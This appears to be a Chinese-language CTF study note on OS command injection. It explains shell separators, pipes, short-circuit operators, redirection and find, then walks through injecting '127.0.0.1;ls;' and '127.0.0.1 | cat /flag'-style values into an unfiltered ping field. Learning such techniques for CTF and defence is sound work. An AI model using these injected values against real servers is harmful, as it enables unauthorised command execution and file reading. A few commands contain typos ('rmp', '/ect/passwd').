# 命令执行

## 管道符

### “;”分号的使用

方式：command1;command2

用分号隔开每条命令，并且从左到右的顺序执行命令，彼此之间相互独立，互不干涉。


### “|”管道符使用

上一条命令的输出，作为下一条命令的输入，在ctf中：ping 127.0.0.1 | ls (只会执行ls不会执行ping命令）

方式：command1 | command2

#### 实例
利用一个管道
```
rmp -qa | grep licq //将rmp -qa输出的结果通过管道输送给grep命令
```
rmp -qa是输出系统中所有安装的RPM包，grep licp是查找有licp字符的RPM包
grep命令是查找文件里满足条件的字符串

利用多条管道
```
cat /ect/passwd | grep /bin/bash | wc -l //将第一个管道的输出（passwd的内容）通过管道输送给第二个管道，将第二管道的输出（passwd内容里有/bin/bash的所有行）通过管道输送给第三个管道，第三个管道通过wc命令统计出输入的行数，并输出
```
wc命令是统计出输入的行数

### “&”符号的用法，在ctf中：ping 127.0.0.1 & ls（先输出ls，再执行ping命令）

方式：command 1&

默认情况下，进程是前台进程，这样会占用shell，无法执行其它进程，所以有些没有的进程都希望可以放在后台，所以此时我们在后台的参数后面加上“&”实现这个目的

### “&&”符号和“||”符号

“&&”和“||”符号满足短路原则。“&&”符号，如果左边为假，则不执行右边，反之，执行右边。而“||”符号，如果左边为真，则不执行右边，反之，执行右边

“&&”格式：command 1 && command 2
“||”格式：command 1 || command 2

#### 实例
判断主机存活
```
ping -c 1 -w 1 192.168.1.1 &> /dev/null && result=0 || result=1
```
重定向：>和>>是输出重定向，>是覆盖文件中的原有文件，文件存在，则删除文件并新建文件，并输入数据内容
                                              >>是在原有文件里的内容后面添加，没有文件则创建文件，并添加内容
             <是输入重定向
             &>是命令的标准正确输出或标准错误输出直接输出到你重定向的文件中

### linux下的find命令

.表示当前用户下的目录，/表示系统的根目录

find / -name filename //查找系统目录下的filename文件

find命令的详细讲解：https://www.cnblogs.com/yorkyang/p/6294894.html


### 实例
先构造
```
127.0.0.1;ls;
```
可以看到index.php文件

然后构造
```
127.0.0.1 | cat /index.php
```
发现一串php代码，通过审计代码发现没有任何过滤

因此构造
```
127.0.0.1 | find / -name flag
```

可以看到flag在/flag里

所以构造
```
127.0.0.1 | cat /flag
```




